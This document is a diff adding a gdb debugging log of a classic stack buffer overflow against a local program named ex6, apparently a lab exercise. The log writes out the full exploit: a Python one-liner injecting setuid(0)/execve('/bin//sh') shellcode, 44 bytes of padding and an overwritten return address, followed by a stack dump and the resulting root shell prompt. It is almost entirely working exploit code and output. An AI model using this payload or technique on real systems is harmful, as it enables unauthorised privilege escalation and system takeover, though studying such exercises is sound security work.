@@ -1,0 +1,22 @@
+(gdb) run $(python -c 'print "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "B"*44 + "\x60\xf4\xff\xbf"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/Desktop/ex6 $(python -c 'print "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "B"*44 + "\x60\xf4\xff\xbf"')
+
+Breakpoint 1, 0x0804847f in main ()
+(gdb) x /40x $esp
+0xbffff450:	0xbffff460	0xbffff6bc	0xbffff477	0x00000001
+0xbffff460:	0xc389c031	0x80cd17b0	0x6852d231	0x68732f6e
+0xbffff470:	0x622f2f68	0x52e38969	0x8de18953	0x80cd0b42
+0xbffff480:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff490:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff4a0:	0x42424242	0x42424242	0x42424242	0xbffff460
+0xbffff4b0:	0x00000000	0xbffff554	0xbffff560	0xb7fe0860
+0xbffff4c0:	0xb7ff6821	0xffffffff	0xb7ffeff4	0x0804826d
+0xbffff4d0:	0x00000001	0xbffff510	0xb7fefc16	0xb7fffac0
+0xbffff4e0:	0xb7fe0b58	0xb7fbeff4	0x00000000	0x00000000
+(gdb) continue
+Continuing.
+process 8698 is executing new program: /bin/dash
+# 
